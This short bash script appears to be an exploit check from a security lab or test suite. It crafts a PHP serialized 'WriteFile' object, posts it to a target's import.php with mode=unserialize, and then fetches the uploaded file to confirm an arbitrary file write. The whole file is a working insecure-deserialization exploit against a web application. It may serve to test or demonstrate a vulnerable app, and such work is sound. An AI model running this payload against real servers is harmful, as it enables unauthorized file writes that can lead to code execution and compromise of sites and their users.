#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
name="deser_$$.txt"
path="/var/www/html/uploads/$name"
data="PHP_UNSERIALIZE_42"
payload=$(python3 - "$path" "$data" <<'PY'
import sys
p,d=sys.argv[1],sys.argv[2]
print(f'O:9:"WriteFile":2:{{s:4:"path";s:{len(p)}:"{p}";s:4:"data";s:{len(d)}:"{d}";}}')
PY
)
curl -s -X POST "$TARGET/import.php" -d 'mode=unserialize' --data-urlencode "data=$payload" >/dev/null
curl -s "$TARGET/uploads/$name" | grep -q "$data"
